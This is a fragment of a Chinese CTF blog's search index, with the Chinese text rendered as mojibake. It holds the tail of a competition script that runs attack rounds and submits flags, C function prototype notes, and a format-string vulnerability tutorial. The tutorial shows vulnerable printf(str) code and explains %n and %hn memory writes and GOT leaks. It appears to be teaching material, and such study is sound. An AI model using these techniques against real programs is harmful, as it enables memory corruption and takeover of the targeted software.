class="line">    <span class="built_in">wait</span> <span class="comment"># Ensure all attacks are complete before moving on</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Waiting <span class="variable">$wait_submit_time</span> s to submit flag\x1b[0m&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="variable">$wait_submit_time</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Submitting flag\x1b[0m&quot;</span></span><br><span class="line">    python3 ./submit_flag.py</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i &lt;= attack_times; i++)); <span class="keyword">do</span></span><br><span class="line">    m=<span class="string">&quot;-------- round <span class="variable">$i</span> --------&quot;</span></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;<span class="variable">$m</span>&quot;</span></span><br><span class="line">    attack <span class="variable">$i</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Waiting next round\x1b[0m&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="variable">$round_wait_time</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="æµé‡ç›‘æ§"><a href="#æµé‡ç›‘æ§" class="headerlink" title="æµé‡ç›‘æ§"></a>æµé‡ç›‘æ§</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å¹¶èµ‹ä¸€å®šæƒé™ï¼Œæ”¹makefileä¸­çš„log pathä¸ºè¯¥æ–‡ä»¶å¤¹åœ°å€ï¼Œmakeåå°†pwnå’Œcatchæ”¾åˆ°åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­ï¼Œå†ç”¨catchæ›¿æ¢pwnæ–‡ä»¶ï¼Œæ­¤æ—¶expæ‰“ç”¨catchæ›¿æ¢çš„pwnæ–‡ä»¶å³å¯åœ¨åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­æ¥æ”¶åˆ°æµé‡</p><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€å‡½æ•°åŸå‹æ•´ç†</title>
      <link href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p><strong>å½“systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°<code>rdi</code>é‡Œçš„å‚æ•°</strong></p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p><code>writeï¼ˆ1ï¼Œwrite_gotï¼Œ8</code>ï¼‰æ˜¯æŠŠwrite_gotåœ°å€æŒ‡å‘å†…å­˜çš„å†…å®¹çš„å‰8ä¸ªå­—èŠ‚å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºæµä¸­ã€‚<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span><br><span class="line">å‚æ•°è¯´æ˜:</span><br><span class="line">â€Œfdâ€Œ:æ–‡ä»¶æè¿°ç¬¦ï¼Œè¡¨ç¤ºè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶æˆ–è®¾å¤‡ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œé€šå¸¸æ˜¯ç”±openç³»ç»Ÿè°ƒç”¨è¿”å›çš„ã€‚ä¾‹å¦‚ï¼Œ0è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼ˆ<span class="built_in">stdin</span>ï¼‰ï¼Œ1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼ˆ<span class="built_in">stdout</span>ï¼‰ï¼Œ2è¡¨ç¤ºæ ‡å‡†é”™è¯¯ï¼ˆ<span class="built_in">stderr</span>ï¼‰ã€‚</span><br><span class="line">â€Œbufâ€Œ:æŒ‡å‘è¦å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚è¿™ä¸ªæŒ‡é’ˆå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› ä¸ºå®ƒæ˜¯<span class="type">void</span>ç±»å‹çš„ã€‚</span><br><span class="line">countâ€Œ:è¦å†™å…¥çš„å­—èŠ‚æ•°ã€‚å‡½æ•°ä¼šå°è¯•ä»bufä¸­å†™å…¥countä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</span><br><span class="line">â€Œè¿”å›å€¼:</span><br><span class="line">æ­£æ•´æ•°:è¡¨ç¤ºæˆåŠŸå†™å…¥çš„å­—èŠ‚æ•°ï¼Œå¯èƒ½ä¼šå°äºcountï¼ˆä¾‹å¦‚ï¼Œç”±äºç£ç›˜å·²æ»¡ç­‰åŸå› ï¼‰ã€‚</span><br><span class="line">0â€Œ:è¡¨ç¤ºæ²¡æœ‰å†™å…¥ä»»ä½•æ•°æ®ã€‚</span><br><span class="line">-1â€Œâ€Œ:è¡¨ç¤ºå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è®¾ç½®`errno`æ¥æä¾›è¿›ä¸€æ­¥çš„é”™è¯¯ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">void</span>*buf,<span class="type">size_t</span> count)</span></span><br><span class="line">å‚æ•°è¯´æ˜ï¼š</span><br><span class="line">fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">buf:ä¸ºè¯»å‡ºæ•°æ®çš„ç¼“å†²åŒº;</span><br><span class="line">count:ä¸ºæ¯æ¬¡è¯»å–çš„å­—èŠ‚æ•°ï¼ˆæ˜¯è¯·æ±‚è¯»å–çš„å­—èŠ‚æ•°ï¼Œè¯»ä¸Šæ¥çš„æ•°æ®ä¿å­˜åœ¨ç¼“å†²åŒºbufä¸­ï¼ŒåŒæ—¶æ–‡ä»¶çš„å½“å‰è¯»å†™ä½ç½®å‘åç§»)</span><br><span class="line">æˆåŠŸ:è¿”å›è¯»å‡ºçš„å­—èŠ‚æ•°</span><br><span class="line">å¤±è´¥:è¿”å›<span class="number">-1</span>ï¼Œå¹¶è®¾ç½®errnoï¼Œå¦‚æœåœ¨è°ƒç”¨readä¹‹å‰åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œåˆ™è¿™æ¬¡readè¿”å›<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> * <span class="title function_">memset</span><span class="params">( <span class="type">void</span> * ptr, <span class="type">int</span> value, <span class="type">size_t</span> num )</span>;</span><br><span class="line">å‚æ•°è¯´æ˜ï¼š</span><br><span class="line">ptr:ä¸ºè¦æ“ä½œçš„å†…å­˜çš„æŒ‡é’ˆã€‚</span><br><span class="line">value:ä¸ºè¦è®¾ç½®çš„å€¼ã€‚ä½ æ—¢å¯ä»¥å‘ value ä¼ é€’ <span class="type">int</span> ç±»å‹çš„å€¼ï¼Œä¹Ÿå¯ä»¥ä¼ é€’ <span class="type">char</span> ç±»å‹çš„å€¼ï¼Œ<span class="type">int</span> å’Œ <span class="type">char</span> å¯ä»¥æ ¹æ® ASCII ç ç›¸äº’è½¬æ¢ã€‚</span><br><span class="line">num:ä¸º ptr çš„å‰ num ä¸ªå­—èŠ‚</span><br><span class="line"><span class="type">size_t</span>:å°±æ˜¯<span class="type">unsigned</span> <span class="type">int</span>ã€‚</span><br></pre></td></tr></table></figure><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br><span class="line"></span><br><span class="line">ptr â€“ è¿™æ˜¯æŒ‡å‘å¸¦æœ‰æœ€å°å°ºå¯¸ size*nmemb å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ</span><br><span class="line">size â€“ è¿™æ˜¯è¦è¯»å–çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</span><br><span class="line">nmemb â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚</span><br><span class="line">stream â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥æµ</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
      <link href="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_34128411/article/details/87980752">æ¼æ´æŒ–æ˜åŸºç¡€ä¹‹æ ¼å¼åŒ–å­—ç¬¦ä¸²-CSDNåšå®¢</a></p></blockquote><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚ä¸€èˆ¬æ¥è¯´æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸‰ä¸ªéƒ¨åˆ†</p><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li><li>åç»­å‚æ•°<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</h3>è¾“å…¥å‡½æ•°ï¼š<code>scanf</code><br>è¾“å‡ºå‡½æ•°ï¼š<img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209201042.png" alt="Pasted image 20250209201042"></li></ul><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3><p>åŸºæœ¬æ ¼å¼å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%[parameter] [flag] [field width] [.precision] [length] type</span><br></pre></td></tr></table></figure><br>ä¸­æ‹¬å·ä¸­çš„å±æ€§æ˜¯å¯é€‰çš„ï¼Œä¸éœ€è¦ä¸€å®šéƒ½å†™ä¸Šï¼Œæ¯”å¦‚%08xï¼Œä»–å°±åªç”¨åˆ°äº†å…¶ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ä¸‹é¢ä¸¾å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å±æ€§è®²ä¸€ä¸‹ï¼š<br><code>parameter</code></p><ul><li>n$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°<br><code>flag</code><br><code>field width</code>ï¼Œè¾“å‡ºçš„æœ€å°å®½åº¦<br><code>precision</code>ï¼Œè¾“å‡ºçš„æœ€å¤§é•¿åº¦<br><code>length</code>ï¼Œè¾“å‡ºçš„é•¿åº¦</li><li>hhï¼Œè¾“å‡ºä¸€ä¸ªå­—èŠ‚</li><li>hï¼Œè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚<br><code>type</code></li><li>d/iï¼Œæœ‰ç¬¦å·æ•´æ•°</li><li>uï¼Œæ— ç¬¦å·æ•´æ•°</li><li>x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>oï¼Œ8 è¿›åˆ¶ unsigned int ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>sï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼Œè¾“å‡º null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚å¦‚æœç”¨äº† l æ ‡å¿—ï¼Œåˆ™å¯¹åº”å‡½æ•°å‚æ•°æŒ‡å‘ wchar_t å‹çš„æ•°ç»„ï¼Œè¾“å‡ºæ—¶æŠŠæ¯ä¸ªå®½å­—ç¬¦è½¬åŒ–ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼Œç›¸å½“äºè°ƒç”¨ wcrtomb å‡½æ•°ã€‚</li><li>cï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡ºï¼›å¦‚æœç”¨äº† l æ ‡å¿—ï¼ŒæŠŠ wint_t å‚æ•°è½¬ä¸ºåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„ wchart_t æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ åŒ…å«è¦è¾“å‡ºçš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸º null å®½å­—ç¬¦ã€‚</li><li>pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf(â€œ%pâ€,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf(â€œ%pâ€, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚</li><li>nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</li><li>%ï¼Œ â€˜%â€™å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚<h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3>è¦è¾“å‡ºçš„å˜é‡</li></ul><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ ¼å¼åŒ–ä¸²æ¼æ´å’Œæ™®é€šçš„æ ˆæº¢å‡ºæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½æ˜¯åˆ©ç”¨ç¨‹åºå‘˜çš„ç–å¿½å¤§æ„æ¥æ”¹å˜ç¨‹åºè¿è¡Œçš„æ­£å¸¸æµç¨‹ã€‚<br>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œprint()ã€fprint()ç­‰<code>*print()</code>ç³»åˆ—çš„å‡½æ•°å¯ä»¥æŒ‰ç…§ä¸€å®šçš„æ ¼å¼å°†æ•°æ®è¿›è¡Œè¾“å‡ºï¼Œä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My Name is:  %s&quot;</span> , <span class="string">&quot;Zechariah&quot;</span>)</span><br></pre></td></tr></table></figure><br>æ‰§è¡Œè¯¥å‡½æ•°åå°†è¿”å›å­—ç¬¦ä¸²ï¼šMy Name isï¼šZechariah<br>è¯¥printfå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå®ƒæ¥å‘Šè¯‰ç¨‹åºå°†æ•°æ®ä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡ºã€‚<br>printf()å‡½æ•°çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š<code>printf(&quot;format&quot;, è¾“å‡ºè¡¨åˆ—)</code>ï¼Œæˆ‘ä»¬å¯¹formatæ¯”è¾ƒå…³å¿ƒï¼Œçœ‹ä¸€ä¸‹å®ƒçš„ç»“æ„å§ï¼š<code>%[æ ‡å¿—][è¾“å‡ºæœ€å°å®½åº¦][.ç²¾åº¦][é•¿åº¦]ç±»å‹</code>,å…¶ä¸­è·Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ‰å…³ç³»çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š<br>1ã€è¾“å‡ºæœ€å°å®½åº¦ï¼šç”¨åè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°‘ä½æ•°ã€‚è‹¥å®é™…ä½æ•°å¤šäºå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®é™…ä½æ•°è¾“å‡ºï¼Œè‹¥å®é™…ä½æ•°å°‘äºå®šä¹‰çš„å®½åº¦åˆ™è¡¥ä»¥ç©ºæ ¼æˆ–0ã€‚<br>2ã€ç±»å‹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">%dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">%xï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œå¦‚%i$xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„4å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ%i$1xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„8å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚</span><br><span class="line"></span><br><span class="line">%pï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œä¸%xåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€0xï¼Œåœ¨32bitä¸‹è¾“å‡º4å­—èŠ‚ï¼Œåœ¨64bitä¸‹è¾“å‡º8å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯32bitè¿˜æ˜¯64bitã€‚</span><br><span class="line"></span><br><span class="line">%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">%nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ï¼Œå¦‚%100x10$nè¡¨ç¤ºå°†ex64å†™å…¥åç§»10å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œè€Œ%$hnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º2å­—èŠ‚ï¼Œ%$hhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º1å­—èŠ‚ï¼Œ%$llnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸ºå…«å­—èŠ‚ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚æœ‰æ—¶ï¼Œç›´æ¥å†™4å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%$hnæˆ–%$hhnæ¥é€‚æ—¶è°ƒæ•´</span><br><span class="line"></span><br><span class="line">%næ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œè€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%nå†™æ•°æ®ã€‚</span><br></pre></td></tr></table></figure></p><p>å…³äºprintf()å‡½æ•°çš„ä½¿ç”¨ï¼Œæ­£å¸¸æˆ‘ä»¬ä½¿ç”¨printf()å‡½æ•°åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ­£ç¡®çš„ä½¿ç”¨æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿæœ‰çš„äººä¼šè¿™ä¹ˆç”¨ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤æ®µä»£ç ï¼Œå¾ˆæ˜æ˜¾ï¼Œç¬¬äºŒä¸ªç¨‹åºä¸­çš„printf()å‡½æ•°å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œ<strong>æˆ‘ä»¬åœ¨æ§åˆ¶äº†formatå‚æ•°ä¹‹åç»“åˆprintf()å‡½æ•°çš„ç‰¹æ€§å°±å¯ä»¥è¿›è¡Œç›¸åº”çš„æ”»å‡»ã€‚</strong></p><h2 id="å‡½æ•°ç‰¹æ€§"><a href="#å‡½æ•°ç‰¹æ€§" class="headerlink" title="å‡½æ•°ç‰¹æ€§"></a>å‡½æ•°ç‰¹æ€§</h2><h4 id="ç‰¹æ€§ä¸€ï¼š-printf-å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š"><a href="#ç‰¹æ€§ä¸€ï¼š-printf-å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š" class="headerlink" title="ç‰¹æ€§ä¸€ï¼š printf()å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š"></a>ç‰¹æ€§ä¸€ï¼š printf()å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§è¿›è¡Œè¶Šç•Œæ•°æ®çš„è®¿é—®ã€‚æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªæ­£å¸¸çš„ç¨‹åºï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line"><span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç¼–è¯‘ä¹‹åè¿è¡Œï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -fno-<span class="built_in">stack</span>-protector -o format format.c</span><br><span class="line">[email protected]:~/Desktop/format$ ./format </span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬åšä¸€ä¸‹æµ‹è¯•ï¼Œæˆ‘ä»¬å¢åŠ ä¸€ä¸ªprintf()çš„formatå‚æ•°ï¼Œæ”¹ä¸ºï¼š<br><code>printf(&quot;%s %d %d %d %x\n&quot;,buf,a,bï¼Œc)</code>ï¼Œç¼–è¯‘åè¿è¡Œï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -z execstack -fno-<span class="built_in">stack</span>-protector -o format1 format.c</span><br><span class="line">format.c: In function â€˜mainâ€™:</span><br><span class="line">format.c:<span class="number">6</span>:<span class="number">1</span>: warning: format â€˜%xâ€™ expects a matching â€˜<span class="type">unsigned</span> <span class="type">int</span>â€™ argument [-Wformat=]</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c);</span><br><span class="line"> ^</span><br><span class="line">[email protected]:~/Desktop/format$ ./format1</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> 